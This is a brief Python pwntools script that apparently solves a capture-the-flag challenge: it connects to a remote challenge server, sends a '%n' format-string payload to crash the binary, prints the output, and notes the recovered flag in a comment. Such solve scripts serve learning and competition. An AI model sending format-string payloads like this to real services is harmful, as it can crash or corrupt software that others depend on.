from pwn import *
elf = context.binary = ELF("./main")
# r = process()
r = remote("ctf-chall.stembascc.com",5226)
format_specofoer_that_make_sigsev_except_s = "%n"
r.sendline(format_specofoer_that_make_sigsev_except_s)
print(r.recvall().strip().decode())

# FLAG : LKS{KAMU_B3RHASIL_YEYYYYYYYYYYY}
# Vulnerability nya silahkan liat di fungsi setup()